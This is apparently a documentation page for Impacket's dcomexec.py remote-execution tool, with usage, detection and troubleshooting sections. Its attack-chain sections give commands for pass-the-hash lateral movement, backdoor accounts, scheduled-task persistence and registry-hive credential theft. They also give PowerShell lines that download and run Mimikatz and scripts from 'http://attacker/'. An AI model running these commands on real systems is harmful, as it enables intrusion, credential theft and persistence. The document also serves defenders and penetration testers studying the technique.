# dcomexec.py

## Overview
`dcomexec.py` is a remote execution tool in the Impacket suite that leverages DCOM (Distributed Component Object Model) for command execution on remote Windows systems. This tool is categorized under Lateral Movement and provides functionality for executing commands through various COM objects without creating Windows services.

## Detailed Description
`dcomexec.py` implements a remote command execution technique that uses DCOM objects instead of traditional service-based methods like psexec. The tool leverages legitimate Windows COM objects that can be instantiated remotely and used to execute commands. This approach is often less monitored than SMB-based service creation and can bypass certain security controls.

The tool was inspired by research from Matt Nelson (@enigma0x3) who discovered that various COM objects could be used for lateral movement. Unlike psexec or smbexec, dcomexec doesn't create Windows services, making it potentially more stealthy and suitable for environments where service creation is heavily monitored.

### Key Features:
- **Multiple DCOM Objects**: Supports ShellWindows, ShellBrowserWindow, and MMC20.Application objects
- **Service-less Execution**: No Windows service creation required, reducing detection
- **DCOM Protocol**: Uses DCOM over RPC for remote object instantiation and command execution
- **Shell Options**: Choice between cmd and PowerShell execution environments
- **Silent Execution**: Option for commands without output retrieval for stealth operations
- **Flexible Authentication**: Support for password, hash, and Kerberos authentication methods

### Technical Details:
- Uses DCOM objects: MMC20.Application, ShellWindows, ShellBrowserWindow
- Requires DCOM port access (135 + dynamic RPC ports typically 1024-49151)
- Leverages IDispatch interface for command execution through COM automation
- Compatible with Windows 7, Windows 10, Server 2012R2+ (object-dependent)
- Note: Kerberos authentication has known checksum issues due to sequence number synchronization

### Supported DCOM Objects:
- **MMC20.Application** (49B2791A-B1AE-4C90-9B8E-E860BA07F889): Microsoft Management Console automation
- **ShellWindows** (9BA05972-F6A8-11CF-A442-00A0C90A8F39): Windows Shell automation interface  
- **ShellBrowserWindow** (C08AFD90-F2A1-11D1-8455-00A0C91F3880): Shell browser window automation
1. **MMC20.Application** (49B2791A-B1AE-4C90-9B8E-E860BA07F889)
2. **ShellWindows** (9BA05972-F6A8-11CF-A442-00A0C90A8F39) - Default
3. **ShellBrowserWindow** (C08AFD90-F2A1-11D1-8455-00A0C91F3880)

## Command Line Options

```
usage: dcomexec.py [-h] [-share SHARE] [-nooutput] [-ts] [-debug] [-codec CODEC]
                   [-object {ShellWindows,ShellBrowserWindow,MMC20}] 
                   [-com-version MAJOR_VERSION:MINOR_VERSION] [-shell-type {cmd,powershell}]
                   [-silentcommand] [-hashes LMHASH:NTHASH] [-no-pass] [-k] 
                   [-aesKey hex key] [-dc-ip ip address] [-A authfile] [-keytab KEYTAB]
                   target [command ...]

Executes a semi-interactive shell using DCOM objects.

Required Arguments:
  target                [[domain/]username[:password]@]<targetName or address>

Optional Arguments:
  -share SHARE          Share where the output will be grabbed from (default: ADMIN$)
  -nooutput             Whether or not to print the output (no SMB connection created)
  -object {ShellWindows,ShellBrowserWindow,MMC20}
                        DCOM object to be used to execute the shell command (default: ShellWindows)
  -com-version MAJOR_VERSION:MINOR_VERSION
                        DCOM version, format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7
  -shell-type {cmd,powershell}
                        Choose a command processor for the semi-interactive shell
  -silentcommand        Does not execute cmd.exe to run given command (no output)
  -codec CODEC          Sets encoding used from the target's output
  -ts                   Adds timestamp to every logging output
  -debug                Turn DEBUG output ON

Command Execution:
  command               Command to execute at the target. If empty, launches semi-interactive shell

Authentication:
  -hashes LMHASH:NTHASH NTLM hashes, format is LMHASH:NTHASH
  -no-pass              Don't ask for password (useful for -k)
  -k                    Use Kerberos authentication
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -dc-ip ip address     IP Address of the domain controller
  -A authfile           smbclient/mount.cifs-style authentication file
  -keytab KEYTAB        Read keys for SPN from keytab file
```

## Usage Examples

### Basic DCOM Execution
```bash
# Interactive shell using default ShellWindows object
python3 dcomexec.py domain.com/admin:password@192.168.1.100

# Execute single command with ShellWindows
python3 dcomexec.py domain.com/admin:password@192.168.1.100 "whoami"

# Using NTLM hash authentication
python3 dcomexec.py -hashes :5e884898da28047151d0e56f8dc6292773603d0d domain.com/admin@192.168.1.100

# Using Kerberos authentication
python3 dcomexec.py -k domain.com/admin:password@target.domain.com
```

### DCOM Object Selection
```bash
# Use MMC20.Application object (most compatible)
python3 dcomexec.py -object MMC20 domain.com/admin:password@192.168.1.100

# Use ShellBrowserWindow object (Windows 10, Server 2012R2+)
python3 dcomexec.py -object ShellBrowserWindow domain.com/admin:password@192.168.1.100

# Use ShellWindows object (default, broad compatibility)
python3 dcomexec.py -object ShellWindows domain.com/admin:password@192.168.1.100
```

### Shell Type and Output Options
```bash
# Use PowerShell instead of cmd
python3 dcomexec.py -shell-type powershell domain.com/admin:password@192.168.1.100

# Silent execution without output retrieval
python3 dcomexec.py -nooutput domain.com/admin:password@192.168.1.100 "net user backdoor Password123! /add"

# Silent command execution (direct execution without cmd.exe wrapper)
python3 dcomexec.py -silentcommand domain.com/admin:password@192.168.1.100 "calc.exe"

# Custom output share
python3 dcomexec.py -share C$ domain.com/admin:password@192.168.1.100
```

### Advanced Options
```bash
# Custom character encoding
python3 dcomexec.py -codec cp1252 domain.com/admin:password@192.168.1.100

# Debug mode with timestamps
python3 dcomexec.py -debug -ts domain.com/admin:password@192.168.1.100

# Specify DCOM version
python3 dcomexec.py -com-version 5.7 domain.com/admin:password@192.168.1.100

# Using authentication file
python3 dcomexec.py -A auth.txt target.domain.com

# Using keytab file
python3 dcomexec.py -keytab admin.keytab -k domain.com/admin@target.domain.com
```

## Attack Chain Integration

### Lateral Movement via DCOM
```bash
# Step 1: Obtain credentials through various methods
python3 secretsdump.py domain.com/user:password@dc.domain.com

# Step 2: Use extracted credentials for DCOM-based lateral movement
python3 dcomexec.py -hashes :extracted_hash domain.com/admin@target1.domain.com

# Step 3: Chain execution across multiple systems
python3 dcomexec.py -object MMC20 -hashes :admin_hash domain.com/admin@target2.domain.com
python3 dcomexec.py -object ShellBrowserWindow -hashes :admin_hash domain.com/admin@target3.domain.com
```

### Stealth Command Execution
```bash
# Step 1: Connect via DCOM with no output for stealth
python3 dcomexec.py -nooutput domain.com/admin:password@192.168.1.100 "powershell -enc <base64_payload>"

# Step 2: Use silent commands to avoid cmd.exe detection
python3 dcomexec.py -silentcommand domain.com/admin:password@192.168.1.100 "rundll32.exe payload.dll,EntryPoint"

# Step 3: Deploy persistence mechanism
python3 dcomexec.py -object MMC20 domain.com/admin:password@192.168.1.100 "schtasks /create /tn backdoor /tr 'powershell.exe -enc <payload>' /sc onlogon"
```

### Post-Exploitation Operations
```bash
# Step 1: Establish interactive shell via DCOM
python3 dcomexec.py -object MMC20 domain.com/admin:password@192.168.1.100

# Step 2: Execute reconnaissance commands
C:\> whoami /all
C:\> net localgroup administrators
C:\> wmic computersystem get domain
C:\> reg query "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall"

# Step 3: Deploy additional tools
C:\> powershell -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/script.ps1')"
```

### Credential Harvesting via DCOM
```bash
# Step 1: Access target via DCOM
python3 dcomexec.py -object ShellWindows domain.com/admin:password@192.168.1.100

# Step 2: Extract credentials using various techniques
C:\> reg save hklm\sam C:\temp\sam.hive
C:\> reg save hklm\security C:\temp\security.hive
C:\> reg save hklm\system C:\temp\system.hive

# Step 3: Use PowerShell for in-memory credential extraction
C:\> powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/Invoke-Mimikatz.ps1'); Invoke-Mimikatz"
```

### Cross-Platform DCOM Attacks
```bash
# Step 1: Execute from Linux to Windows targets
python3 dcomexec.py -object MMC20 domain.com/admin:password@windows-target.domain.com

# Step 2: Bypass traditional SMB-based detection
python3 dcomexec.py -nooutput domain.com/admin:password@192.168.1.100 "powershell -c 'Start-Process calc.exe'"

# Step 3: Use for environments where SMB execution is blocked
python3 dcomexec.py -object ShellBrowserWindow domain.com/admin:password@hardened-target.domain.com
```

## DCOM Object Compatibility

### MMC20.Application
- **Compatibility**: Windows 7, Windows 10, Server 2012R2+
- **Reliability**: High - Most stable across different Windows versions
- **Detection**: Moderate - MMC process creation may be monitored
- **Use Case**: Broad compatibility scenarios, primary choice for mixed environments

### ShellWindows
- **Compatibility**: Windows 7, Windows 10, Server 2012R2+
- **Reliability**: High - Default object, well-tested
- **Detection**: Low to Moderate - Explorer process usage
- **Use Case**: Default choice for most operations

### ShellBrowserWindow
- **Compatibility**: Windows 10, Server 2012R2+ (limited older OS support)
- **Reliability**: Moderate - More recent object, less tested on legacy systems
- **Detection**: Low - Browser window automation
- **Use Case**: Modern Windows environments, stealth operations

## Technical Implementation Details

### DCOM Object Instantiation Process
1. **DCOM Connection**: Establishes DCOM connection to target system
2. **Object Creation**: Instantiates selected COM object remotely
3. **Interface Binding**: Binds to IDispatch interface for automation
4. **Command Execution**: Invokes methods to execute commands
5. **Output Retrieval**: Collects output via SMB share (if not silent)
6. **Cleanup**: Releases COM objects and closes connections

### Port Requirements
- **Initial Connection**: TCP 135 (RPC Endpoint Mapper)
- **Dynamic Ports**: TCP 1024-49151 (or configured RPC port range)
- **SMB Output**: TCP 445 (if output retrieval enabled)

### Authentication Methods
- **NTLM**: Standard username/password or hash authentication
- **Kerberos**: Domain authentication (with known limitations)
- **Local**: Local administrator account authentication

## Detection and Mitigation

### Detection Methods
```bash
# Monitor for unusual DCOM activity
# Windows Event Logs to monitor:
# EventID 4648 - Logon with explicit credentials (DCOM authentication)
# EventID 4624 - Successful logon (DCOM session establishment)

# Process monitoring for DCOM objects:
# mmc.exe spawning unusual child processes (MMC20.Application)
# explorer.exe with unusual command-line arguments (ShellWindows/ShellBrowserWindow)

# Network monitoring:
# RPC traffic to port 135 from external sources
# Dynamic RPC port connections following 135 access
```

### Registry and File Artifacts
```bash
# DCOM object access may leave traces in:
# HKLM\SOFTWARE\Classes\CLSID\{GUID}\LocalServer32
# Windows event logs (Application, System, Security)
# Process creation events via Sysmon (EventID 1)

# File system artifacts:
# Temporary output files in specified shares
# Process memory dumps may contain DCOM object references
```

### Defensive Measures
- **DCOM Hardening**: Disable unnecessary DCOM objects via DCOMCNFG
- **Network Segmentation**: Restrict RPC port access between network segments
- **Process Monitoring**: Monitor for unusual mmc.exe and explorer.exe behavior
- **Authentication Hardening**: Implement strong authentication policies
- **Logging Enhancement**: Enable detailed DCOM and RPC logging

## Common Issues and Troubleshooting

### DCOM Connection Failures
```bash
# Error: DCOM connection failed
# Solution: Check firewall settings and RPC port access
python3 dcomexec.py -debug domain.com/admin:password@192.168.1.100

# Error: Access denied
# Solution: Verify user has DCOM permissions and local logon rights
# Check: Local Security Policy -> User Rights Assignment -> "Log on as a service"
```

### Object Instantiation Issues
```bash
# Error: Object creation failed
# Solution: Try different DCOM object or check Windows version compatibility
python3 dcomexec.py -object MMC20 domain.com/admin:password@192.168.1.100  # Most compatible
python3 dcomexec.py -object ShellWindows domain.com/admin:password@192.168.1.100  # Broad support

# Error: Object not found
# Solution: Verify target OS supports selected DCOM object
# ShellBrowserWindow requires Windows 10 or Server 2012R2+
```

### Authentication Problems
```bash
# Error: Kerberos authentication failed
# Solution: Known issue with sequence numbers, use NTLM instead
python3 dcomexec.py -hashes :ntlm_hash domain.com/admin@192.168.1.100

# Error: Authentication file not working
# Solution: Verify authentication file format matches smbclient style
echo "username=admin" > auth.txt
echo "password=Password123!" >> auth.txt
echo "domain=domain.com" >> auth.txt
```

### Output Retrieval Issues
```bash
# Error: Cannot access output share
# Solution: Check share permissions and try different share
python3 dcomexec.py -share C$ domain.com/admin:password@192.168.1.100

# Error: Encoding issues in output
# Solution: Determine target codepage and specify codec
python3 dcomexec.py -codec cp1252 domain.com/admin:password@192.168.1.100
```

## Related Tools
- [psexec.py](psexec.md) - Service-based remote execution
- [wmiexec.py](wmiexec.md) - WMI-based remote execution
- [smbexec.py](smbexec.md) - SMB-based remote execution without RemComSvc
- [atexec.py](atexec.md) - Remote execution via scheduled tasks
- [secretsdump.py](secretsdump.md) - Credential extraction for lateral movement
- [smbclient.py](smbclient.md) - SMB operations for file transfer

---

*This documentation is based on the actual source code and functionality of dcomexec.py from Impacket.*
